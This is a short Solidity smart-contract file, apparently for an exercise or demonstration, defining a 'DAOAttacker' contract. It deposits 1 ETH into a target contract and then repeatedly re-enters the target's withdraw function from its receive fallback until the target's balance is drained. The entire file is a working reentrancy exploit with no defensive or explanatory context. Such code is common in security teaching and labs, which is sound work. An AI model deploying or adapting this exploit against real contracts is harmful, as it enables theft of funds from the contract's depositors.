// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DAOAttacker {
    address public dao;

    constructor(address _dao) {
        dao = _dao;
    }

    function startAttack() public payable {
        require(msg.value == 1 ether, "Send 1 ETH");

        (bool success, ) = dao.call{value: 1 ether}(
            abi.encodeWithSignature("deposit()")
        );
        require(success, "Deposit failed");

        (success, ) = dao.call(
            abi.encodeWithSignature("withdraw(uint256)", 1 ether)
        );
        require(success, "Withdraw failed");
    }

    receive() external payable {
        if (address(dao).balance >= 1 ether) {
            dao.call(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
        }
    }
}
